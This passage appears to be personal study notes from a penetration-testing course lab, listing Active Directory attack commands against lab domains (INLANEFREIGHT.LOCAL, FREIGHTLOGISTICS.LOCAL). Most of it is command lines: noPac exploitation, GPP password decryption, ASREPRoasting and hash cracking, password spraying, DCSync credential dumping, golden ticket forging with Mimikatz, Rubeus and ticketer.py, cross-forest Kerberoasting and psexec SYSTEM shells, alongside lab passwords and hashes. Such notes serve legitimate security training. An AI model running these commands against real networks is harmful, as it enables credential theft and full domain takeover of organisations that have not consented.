        - sudo python3 [noPac.py](http://nopac.py/) INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
- PrintNightmare
- PetitPotam (MS-EFSRPC)

### Miscellaneous Misconfigurations

- Exchange Related Group Membership
    - The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object
    - [https://github.com/gdedrouas/Exchange-AD-Privesc](https://github.com/gdedrouas/Exchange-AD-Privesc)
- PrivExchange
- Printer Bug
    - Enumerating for MS-PRN Printer Bug
        - Import-Module .\SecurityAssessment.ps1
        - Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
- MS14-068
- Sniffing LDAP Credentials
- Enumerating DNS Records
    - adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
    - head records.csv
    - adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
- Password in Description Field
    - Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
- PASSWD_NOTREQD Field
    - Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
- Credentials in SMB Shares and SYSVOL Scripts
    - Discovering an Interesting Script
        - ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
    - Finding a Password in the Script
- Group Policy Preferences (GPP) Passwords
    - cpassword attribute
    - Decrypting the Password with gpp-decrypt
        - gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
    - [https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
    - [https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1)
    - Locating & Retrieving GPP Passwords with CrackMapExec
        - crackmapexec smb -L | grep gpp
    - crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
- ASREPRoasting
    - Do not require Kerberos pre-authentication setting enabled
    - GenericWrite or GenericaAll → enable this attribute
    - Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
        - Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
    - Retrieving AS-REP in Proper Format using Rubeus
        - .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
    - Cracking the Hash Offline with Hashcat
        - hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
    - Retrieving the AS-REP Using Kerbrute
        - kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
        - kerbrute passwordspray validusers.txt ‘Welcome1’ — dc 172.16.7.3 -d inlanefreight.local
    - Hunting for Users with Kerberoast Pre-auth Not Required
        - [GetNPUsers.py](http://getnpusers.py/) INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
- Group Policy Object (GPO) Abuse
    - Tools - group3r, ADRecon, PingCastle
    - Enumerating GPO Names with PowerView
        - Get-DomainGPO |select displayname
    - Enumerating GPO Names with a Built-In Cmdlet
        - Get-GPO -All | Select DisplayName
    - Enumerating Domain User GPO Rights
        - $sid=Convert-NameToSid "Domain Users”
        - Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
    - Converting GPO GUID to Name
        - Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
    - ShrapGPOAbuse [https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

## Domain Trust

- Enumerating Trust Relationships
    - Import-Module activedirectory
    - Get-ADTrust -Filter *
    - Checking for Existing Trusts using Get-DomainTrust
        - Get-DomainTrust
        - Get-DomainTrustMapping
    - Checking Users in the Child Domain using Get-DomainUser
        - Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
    - Using netdom to query domain trust
        - netdom query /domain:inlanefreight.local trust
    - Using netdom to query domain controllers
        - netdom query /domain:inlanefreight.local dc
    - Using netdom to query workstations and servers
        - netdom query /domain:inlanefreight.local workstation
    - Bloodhound
        - Map Domain Trusts
- Attacking Domain Trusts - Child -> Parent Trusts - from Windows
    - sidHistory
    - ExtraSids Attack - Mimikatz
        - we need
            - The KRBTGT hash for the child domain
            - The SID for the child domain
            - The name of a target user in the child domain (does not need to exist!)
            - The FQDN of the child domain.
            - The SID of the Enterprise Admins group of the root domain.
            - With this data collected, the attack can be performed with Mimikatz.
        - Obtaining the KRBTGT Account's NT Hash using Mimikatz
            - mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
        - Using Get-DomainSID
            - Get-DomainSID
        - Obtaining Enterprise Admins Group's SID using Get-DomainGroup
            - Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
            - Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL”
        - Using ls to Confirm No Access
            - ls \\academy-ea-dc01.inlanefreight.local\c$
        - Creating a Golden Ticket with Mimikatz
            - mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
        - Confirming a Kerberos Ticket is in Memory Using klist
            - klist
        - Listing the Entire C: Drive of the Domain Controller
            - ls \\academy-ea-dc01.inlanefreight.local\c$
    - ExtraSids Attack - Rubeus
        - .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
        - klist
    - Performing a DCSync Attack
        - lsadump::dcsync /user:INLANEFREIGHT\lab_adm
        - lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
- Attacking Domain Trusts - Child -> Parent Trusts - from Linux
    - Performing DCSync with [secretsdump.py](http://secretsdump.py/)
        - [secretsdump.py](http://secretsdump.py/) logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
    - Performing SID Brute Forcing using [lookupsid.py](http://lookupsid.py/)
        - [lookupsid.py](http://lookupsid.py/) logistics.inlanefreight.local/htb-student_adm@172.16.5.240
    - Looking for the Domain SID
        - [lookupsid.py](http://lookupsid.py/) logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID
    - Grabbing the Domain SID & Attaching to Enterprise Admin's RID
        - [lookupsid.py](http://lookupsid.py/) logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
    - Constructing a Golden Ticket using [ticketer.py](http://ticketer.py/)
        - [ticketer.py](http://ticketer.py/) -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
    - Setting the KRB5CCNAME Environment Variable
        - export KRB5CCNAME=hacker.ccache
    - Getting a SYSTEM shell using Impacket's [psexec.py](http://psexec.py/)
        - [psexec.py](http://psexec.py/) LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
    - Impacket also has the tool [raiseChild.py](http://raisechild.py/) [https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
    - Performing the Attack with [raiseChild.py](http://raisechild.py/)
        - [raiseChild.py](http://raisechild.py/) -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
        - [secretsdump.py](http://secretsdump.py/) hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross
        - you can use hash with secrestsdump
- Viewing the Protected Users Group with Get-ADGroup
    - Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members
- Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
    - Cross-Forest Kerberoasting
        - Enumerating Accounts for Associated SPNs Using Get-DomainUser
            - Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
        - Enumerating the mssqlsvc Account
            - Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
        - Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
            - .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
    - Admin Password Re-Use & Group Membership
        - Using Get-DomainForeignGroupMember
            - Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
            - Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
        - Accessing DC03 Using Enter-PSSession
            - Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
    - SID History Abuse - Cross Forest
- Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
    - Cross-Forest Kerberoasting
        - Using [GetUserSPNs.py](http://getuserspns.py/)
            - [GetUserSPNs.py](http://getuserspns.py/) -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
            - [GetUserSPNs.py](http://getuserspns.py/) -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
    - Hunting Foreign Group Membership with Bloodhound-python
        - only `Domain Local Groups` allow users from outside their forest
        - [https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
        - Edit `resolv.conf`
        - Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
            
            ```xml
            domain INLANEFREIGHT.LOCAL
            nameserver 172.16.5.5
            
            OR
            
            domain FREIGHTLOGISTICS.LOCAL
            nameserver 172.16.5.238
            
            ```
            
        - bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
        - bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
        - `Users with Foreign Domain Group Membership`
- `psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238`
- Additional AD Auditing Techniques
    - Creating an AD Snapshot with Active Directory Explorer
    - PingCastle
    - Group3r
    - ADRecon

## Web Attacks

- HTTP Verb Tampering
    - HEAD PUT DELETE OPTIONS PATCH

`